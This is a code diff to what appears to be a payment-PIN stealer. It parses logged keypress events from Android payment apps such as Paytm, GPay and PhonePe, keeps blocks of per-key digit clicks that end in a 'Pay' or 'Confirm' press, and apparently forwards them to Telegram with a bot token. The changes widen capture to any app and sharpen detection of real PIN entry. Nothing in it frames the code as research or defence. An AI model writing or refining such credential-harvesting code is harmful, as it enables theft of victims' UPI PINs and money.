@@ -15,10 +15,10 @@ if not BOT_TOKEN:
 
 # Match any log line whose app column is Paytm / GPay / Google Pay / PhonePe
 APP_LINE_RE = re.compile(
-    r"^\s*(TEXT|CLICKED)\s*->\s*(Paytm|GPay|Google Pay|PhonePe)\s*->\s*\[(?P<val>.*?)\]\s*$",
+    r"^\s*(TEXT|CLICKED)\s*->\s*(?P<app>[^\[\]\-]+?)\s*->\s*\[(?P<val>.*?)\]\s*$",
     re.I,
 )
-SUBMIT_WORDS = re.compile(r"^(Pay|Check|Confirm|Proceed.*|Pay\s*₹.*)$", re.I)
+SUBMIT_WORDS = re.compile(r"^(Pay|Check|Confirm|Submit|Done|Verify|OK|Proceed.*|Pay\s*₹.*)$", re.I)
 DIGIT_ONLY = re.compile(r"^\d{1,8}$")
 
 TG_MSG_LIMIT = 3900  # keep under Telegram's 4096-char cap
@@ -35,13 +35,17 @@ def filter_lines(text: str) -> str:
     blocks = []
     current = []          # candidate block lines
     max_digit_len = 0     # longest digit-value seen in current block
+    has_clicked_digit = False  # PIN pads emit CLICKED per keypress; dialers don't
 
     def close():
-        nonlocal current, max_digit_len
-        if current and max_digit_len >= 4:
+        nonlocal current, max_digit_len, has_clicked_digit
+        # A real PIN-entry block reaches >=4 digits AND has per-key CLICKED events
+        # (this filters plain text/dial pads that only emit TEXT).
+        if current and max_digit_len >= 4 and has_clicked_digit:
             blocks.append("\n".join(current))
         current = []
         max_digit_len = 0
+        has_clicked_digit = False
 
     for raw in text.splitlines():
         ln = raw.rstrip()
@@ -51,10 +55,13 @@ def filter_lines(text: str) -> str:
         if not m:
             close()
             continue
+        event = m.group(1).upper()
         val = m.group("val").strip()
         if DIGIT_ONLY.match(val):
             current.append(ln)
             max_digit_len = max(max_digit_len, len(val))
+            if event == "CLICKED":
+                has_clicked_digit = True
         elif SUBMIT_WORDS.match(val) and current:
             current.append(ln)
             close()
